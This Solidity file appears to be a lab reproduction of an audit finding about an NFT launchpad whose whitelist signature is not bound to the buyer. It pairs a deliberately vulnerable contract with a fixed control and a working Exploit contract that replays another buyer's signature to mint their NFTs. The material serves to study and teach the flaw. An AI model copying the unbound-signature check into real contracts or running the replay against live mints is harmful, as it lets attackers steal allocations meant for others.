// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EthSign Launchpad — whitelist signature is not bound to the buyer
    (OtterSec / Robert Chen, finding #47227)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    authorizedWLSigner signed a digest for a specific buyer. _checkAndSaveWL
    verifies that digest and never checks msg.sender, so another caller
    front-runs the purchase and mints the NFTs.

    The check below is the function the report quotes. SignatureChecker for
    an EOA is ecrecover of the supplied hash. The signature was precomputed
    offline from the public Anvil test key (account 0). The key is not used
    at runtime.

    Signer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    Digest: keccak256(abi.encode(intendedBuyer, 5, code))
*/

contract MockToken {
    string public constant name = "Whitelist NFT";
    string public constant symbol = "WLNFT";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract NFTSimpleAuction {
    error InvalidCode();
    error InvalidSignature();
    error InvalidPurchaseAmount();

    address public authorizedWLSigner;
    MockToken public wl;
    mapping(bytes32 => bool) public _usedCodes;
    mapping(address => uint256) public minted;

    constructor(address signer, MockToken wl_) {
        authorizedWLSigner = signer;
        wl = wl_;
    }

    function purchase(uint256 numberOfNFTs, bytes calldata extraData) external returns (uint256) {
        uint256 approved = _checkAndSaveWL(extraData);
        require(approved == numberOfNFTs, "InvalidPurchaseAmount");
        wl.mint(msg.sender, numberOfNFTs);
        minted[msg.sender] += numberOfNFTs;
        return numberOfNFTs;
    }

    function _checkAndSaveWL(bytes calldata extraData) internal returns (uint256) {
        (uint256 approvedPurchaseAmount, bytes32 hash, bytes memory signature) =
            abi.decode(extraData, (uint256, bytes32, bytes));
        if (_usedCodes[hash]) revert InvalidCode();
        // @> VULN: the signer is checked, but the hash is not bound to msg.sender
        if (_recover(hash, signature) != authorizedWLSigner) revert InvalidSignature();
        // FIX: recompute hash as keccak256(abi.encode(msg.sender, approvedPurchaseAmount, code))
        _usedCodes[hash] = true;
        return approvedPurchaseAmount;
    }

    function _recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s);
    }
}

/// Control: the digest includes msg.sender. The victim's signature does not
/// recover for any other caller.
contract NFTSimpleAuctionFixed {
    error InvalidCode();
    error InvalidSignature();
    error InvalidPurchaseAmount();

    address public authorizedWLSigner;
    MockToken public wl;
    mapping(bytes32 => bool) public usedCodes;
    mapping(address => uint256) public minted;

    constructor(address signer, MockToken wl_) {
        authorizedWLSigner = signer;
        wl = wl_;
    }

    function purchase(uint256 numberOfNFTs, bytes calldata extraData) external returns (uint256) {
        (uint256 approvedPurchaseAmount, bytes32 code, bytes memory signature) =
            abi.decode(extraData, (uint256, bytes32, bytes));
        bytes32 hash = keccak256(abi.encode(msg.sender, approvedPurchaseAmount, code));
        if (usedCodes[hash]) revert InvalidCode();
        if (_recover(hash, signature) != authorizedWLSigner) revert InvalidSignature();
        usedCodes[hash] = true;
        require(approvedPurchaseAmount == numberOfNFTs, "InvalidPurchaseAmount");
        wl.mint(msg.sender, numberOfNFTs);
        minted[msg.sender] += numberOfNFTs;
        return numberOfNFTs;
    }

    function _recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Exploit {
    uint256 public constant N = 5;
    address public constant INTENDED = 0x2222222222222222222222222222222222222222;
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    bytes32 public constant CODE = 0x000000000000000000000000000000000000000000000000000000000000c0de;
    // keccak256(abi.encode(INTENDED, N, CODE)) — signed by SIGNER, not by the attacker.
    bytes32 public constant DIGEST = 0xe0433f4d0100ea6f8016fc3fbad4cfaa4cce1df26cf633197ccc8991b4293936;
    bytes public constant SIG =
        hex"b27d30dd672db1afd121bd93989fc51b835a4ba235354c35be3cbdc6324ff2b9610380b492ae804c2e50eaae4c084ad946e318d9abccc9effeac785ed8230bfd1b";

    MockToken public wl;
    NFTSimpleAuction public auction;
    uint256 public attackerMinted;
    uint256 public intendedMinted;

    function run() external {
        wl = new MockToken();
        auction = new NFTSimpleAuction(SIGNER, wl);

        bytes32 victimDigest = keccak256(abi.encode(INTENDED, N, CODE));
        require(victimDigest == DIGEST, "signature was made for the intended buyer");
        require(address(this) != INTENDED, "caller is not the intended buyer");

        bytes memory extra = abi.encode(N, DIGEST, SIG);
        uint256 minted = auction.purchase(N, extra);
        attackerMinted = wl.balanceOf(address(this));
        intendedMinted = wl.balanceOf(INTENDED);

        require(minted == N, "attacker minted N");
        require(attackerMinted == N, "attacker holds the NFTs");
        require(intendedMinted == 0, "intended buyer received nothing");
        require(auction._usedCodes(DIGEST), "whitelist code consumed by the attacker");
    }
}
